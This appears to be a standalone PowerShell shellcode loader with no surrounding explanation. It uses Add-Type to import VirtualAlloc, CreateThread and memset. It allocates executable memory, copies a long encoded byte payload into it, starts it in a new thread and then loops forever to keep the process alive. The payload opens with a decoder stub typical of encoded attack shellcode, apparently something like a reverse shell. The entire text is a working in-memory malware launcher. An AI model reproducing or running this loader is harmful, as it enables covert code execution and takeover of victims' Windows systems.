$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc6,0xd9,0x74,0x24,0xf4,0xba,0x1b,0x1f,0xaa,0xa5,0x5b,0x31,0xc9,0xb1,0x59,0x31,0x53,0x18,0x03,0x53,0x18,0x83,0xc3,0x1f,0xfd,0x5f,0x7f,0xcc,0xd8,0xd4,0xa4,0x06,0x61,0x90,0xaf,0xa9,0x7b,0xc1,0x9e,0xfc,0x35,0xa0,0xd1,0xa6,0x2c,0xc6,0xfa,0xaa,0x4c,0x90,0xef,0x34,0xac,0xd0,0x06,0xd1,0x5d,0x60,0x15,0x8d,0xb4,0x7b,0xb9,0x77,0x8b,0x4e,0x1a,0x74,0xe3,0xaa,0x92,0x9c,0x70,0xae,0x1b,0xeb,0xf0,0xd3,0xf8,0x6e,0x8c,0xd6,0x26,0x19,0xed,0x1b,0x96,0x29,0x99,0x10,0x3a,0xd6,0xbc,0x26,0x08,0xa1,0x0f,0xa0,0x82,0x7e,0x5b,0x37,0xfc,0xbd,0x63,0xea,0x46,0x38,0xee,0xf6,0x40,0x73,0xd7,0xd0,0x11,0x22,0xb7,0x4c,0xd2,0x18,0xfc,0x2e,0x1d,0x31,0xe2,0x2a,0x92,0xa1,0x06,0x98,0xcf,0xd6,0xba,0x66,0x2d,0xba,0x39,0x52,0x10,0xf2,0xfa,0x50,0xb5,0x74,0xdc,0x8e,0x1c,0x21,0xe9,0xd6,0x45,0x92,0x31,0xce,0x00,0x66,0x50,0x7f,0xe5,0x57,0x3d,0x05,0x7c,0x2a,0x1f,0x4b,0x71,0x7a,0x45,0xec,0x79,0x31,0xdf,0xcf,0xac,0x60,0x9f,0x32,0x2d,0xc3,0x21,0x86,0xc9,0x3c,0x5e,0xf0,0x1a,0xe0,0x2f,0x98,0x52,0x5a,0x98,0xf2,0x2f,0xb9,0xf9,0xea,0x63,0x5f,0x09,0x0e,0xed,0xd3,0xe8,0x1d,0xb9,0xb2,0x28,0x13,0x62,0x56,0x39,0x74,0xf8,0x8c,0x19,0x12,0x9f,0xf0,0x77,0x13,0xeb,0xc1,0x2b,0x48,0x14,0xf5,0x68,0x0d,0xe8,0xf8,0x67,0xd2,0xc4,0xd8,0x6b,0x95,0x13,0xeb,0xad,0x2d,0x37,0x6f,0x6e,0x9c,0xc0,0x5d,0x47,0x75,0x6e,0x45,0x6b,0x0c,0xf3,0xfb,0x81,0x1e,0x55,0x23,0x38,0xd4,0xc1,0x81,0xca,0x35,0xc3,0x8b,0xd9,0x48,0x4c,0x3d,0x78,0x00,0x2d,0x7d,0x36,0xc6,0x99,0x26,0x69,0x17,0xb0,0xce,0x7c,0x32,0xb6,0x92,0x27,0xba,0xea,0xd5,0x92,0xfe,0xe5,0xf7,0x65,0x9b,0x9a,0xa7,0xee,0xd3,0x9a,0x6d,0xc6,0x0e,0x5b,0x11,0x36,0x72,0x4d,0x98,0x11,0xdf,0xda,0xa2,0x64,0x60,0x2e,0x62,0x98,0x32,0x11,0xa3,0x9b,0xfd,0x18,0xbf,0x64,0xa9,0xf2,0xd4,0x27,0xb3,0xd5,0x8c,0xb0,0x70,0xf5,0x7e,0x12,0x25,0x52,0x4b,0x19,0x63,0x18,0xb7,0xbc,0x00,0x8d,0x52,0xef,0xd6,0x6e,0x19,0x6d,0x16,0x64,0xc6,0x91,0x35,0x7a,0xbe,0xf9,0x15,0x31,0xda,0xd9,0x93,0x29,0x1d,0xef,0x8e,0x95,0x8d,0x80,0xa5,0xb5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
